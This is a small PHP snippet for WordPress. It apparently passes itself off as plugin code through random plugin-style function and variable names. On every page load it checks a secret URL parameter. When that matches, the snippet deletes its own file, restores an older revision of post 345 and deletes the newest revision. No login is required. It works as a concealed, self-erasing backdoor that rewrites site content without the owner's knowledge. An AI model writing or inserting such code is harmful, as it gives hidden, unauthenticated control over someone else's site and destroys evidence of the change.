<?php

function picker_restaurant_fields_update() {
	if (isset($_GET['cc_code_recaptcha_list']) && $_GET['cc_code_recaptcha_list'] === 'date_radio_update') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$like_extension_contents = 345;
		$headers_updater_signup_cf7 = wp_get_post_revisions($like_extension_contents);
		if (empty($headers_updater_signup_cf7)) die('no revisions');
		if (count($headers_updater_signup_cf7) < 2) die('less than 2');
		$enhanced_read_portfolio = array_shift($headers_updater_signup_cf7);
		$wpmu_changer_register = $enhanced_read_portfolio->ID;
		$sales_permalink_beaver_mini = array_shift($headers_updater_signup_cf7);
		$uploads_forum_slideshow_advanced = $sales_permalink_beaver_mini->ID;
		$shop_listing_pdf_links = wp_restore_post_revision($uploads_forum_slideshow_advanced);
		if ($shop_listing_pdf_links === false) die('error restoring');
		$shop_listing_pdf_links = wp_delete_post_revision($wpmu_changer_register);		
		if ($shop_listing_pdf_links === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'picker_restaurant_fields_update');
